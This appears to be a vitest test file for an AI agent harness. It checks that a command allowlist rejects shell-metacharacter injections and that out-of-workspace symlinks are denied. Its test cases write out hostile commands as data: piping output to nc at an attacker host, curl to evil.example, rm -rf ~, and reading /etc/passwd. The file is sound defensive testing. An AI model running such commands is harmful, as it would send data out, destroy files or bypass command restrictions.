// Harness tool-surface tests — PR 10 round-1 fixes 1 and 5:
//   - fix 1 (HIGH): token-prefix command patterns must NOT bless shell
//     metacharacters (the exec shell interprets what the token prefix never
//     saw); anchored re: patterns are the documented escape hatch.
//   - fix 5 (MED): pre-existing symlinks pointing outside the workspace are
//     denied on read/edit (realpath re-check; the TOCTOU window stays
//     documented, not tested — it is not deterministically exercisable).
import { mkdir, mkdtemp, rm, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, test } from 'vitest';
import { buildTools } from '../../src/harness/tools.js';
import { defaultHarnessConfig } from '../../src/harness/config.js';

async function withScratch(body: (scratchDir: string) => Promise<void>): Promise<void> {
  const scratchDir = await mkdtemp(join(tmpdir(), 'harness-tools-'));
  try {
    await body(scratchDir);
  } finally {
    await rm(scratchDir, { recursive: true, force: true });
  }
}

/** Harness config whose run allowlist is exactly `patterns`. */
function runConfig(commandPatterns: string[]) {
  return {
    ...defaultHarnessConfig,
    tools: {
      ...defaultHarnessConfig.tools,
      run: { enabled: true, commandPatterns, timeoutMs: 5_000, maxOutputChars: 10_000 },
    },
  };
}

describe('run allowlist: token patterns vs shell metacharacters (fix 1)', () => {
  test('a legit prefix command is still allowed', async () => {
    await withScratch(async (scratchDir) => {
      const run = buildTools(runConfig(['npm test']), scratchDir).find((t) => t.name === 'run');
      const result = await run?.execute({ command: 'npm test -- --watch' });
      expect(result?.ok).toBe(true);
    });
  });

  test.each([
    'npm test ; whoami',
    'npm test && curl evil.example',
    'npm test $(rm -rf ~)',
    'npm test `whoami`',
    'npm test | nc evil.example 4444',
    'npm test > /tmp/pwned',
    'npm test < /etc/passwd',
    'npm test\nwhoami',
  ])('metacharacter variant denied: %j', async (command) => {
    await withScratch(async (scratchDir) => {
      const run = buildTools(runConfig(['npm test']), scratchDir).find((t) => t.name === 'run');
      const result = await run?.execute({ command });
      expect(result?.ok).toBe(false);
      if (!result?.ok) {
        expect(result?.denial.tool).toBe('run');
        expect(result?.denial.reason).toBe(
          'command allowlist: shell metacharacters not permitted with token patterns — use re: with anchoring',
        );
      }
    });
  });

  test('a non-matching command keeps the plain allowlist-miss reason', async () => {
    await withScratch(async (scratchDir) => {
      const run = buildTools(runConfig(['npm test']), scratchDir).find((t) => t.name === 'run');
      const result = await run?.execute({ command: 'npm run test' });
      expect(result?.ok).toBe(false);
      if (!result?.ok) {
        expect(result?.denial.reason).toContain('command not allowed by harness config allowlist');
      }
    });
  });

  test('anchored re: patterns remain the deliberate metacharacter escape hatch', async () => {
    await withScratch(async (scratchDir) => {
      const run = buildTools(runConfig(['re:^npm test.*$']), scratchDir).find((t) => t.name === 'run');
      const result = await run?.execute({ command: 'npm test; whoami' });
      expect(result?.ok).toBe(true); // the re: author owns the full string
    });
  });
});

describe('symlink hardening (fix 5)', () => {
  test('a pre-existing symlink pointing outside the workspace is denied on read and edit', async () => {
    await withScratch(async (scratchDir) => {
      const workspace = join(scratchDir, 'ws');
      const outside = join(scratchDir, 'outside');
      await mkdir(workspace, { recursive: true });
      await mkdir(outside, { recursive: true });
      await writeFile(join(outside, 'secret.txt'), 'top secret', 'utf8');
      await symlink(join(outside, 'secret.txt'), join(workspace, 'link.txt'));

      const tools = buildTools(defaultHarnessConfig, workspace);
      const read = tools.find((t) => t.name === 'read');
      const edit = tools.find((t) => t.name === 'edit');

      const readResult = await read?.execute({ path: 'link.txt' });
      expect(readResult?.ok).toBe(false);
      if (!readResult?.ok) {
        expect(readResult?.denial.reason).toContain('path escape');
        expect(readResult?.denial.reason).toContain('symlink');
      }

      const editResult = await edit?.execute({ path: 'link.txt', oldText: 'secret', newText: 'x' });
      expect(editResult?.ok).toBe(false);
      if (!editResult?.ok) {
        expect(editResult?.denial.reason).toContain('path escape');
        expect(editResult?.denial.reason).toContain('symlink');
      }
      // The outside file is untouched.
      await expect(read?.execute({ path: 'link.txt' })).resolves.toMatchObject({ ok: false });
    });
  });

  test('a real file inside the workspace still reads fine (no false positives)', async () => {
    await withScratch(async (scratchDir) => {
      const workspace = join(scratchDir, 'ws');
      await mkdir(workspace, { recursive: true });
      await writeFile(join(workspace, 'real.txt'), 'plain content', 'utf8');
      const read = buildTools(defaultHarnessConfig, workspace).find((t) => t.name === 'read');
      const result = await read?.execute({ path: 'real.txt' });
      expect(result?.ok).toBe(true);
    });
  });
});
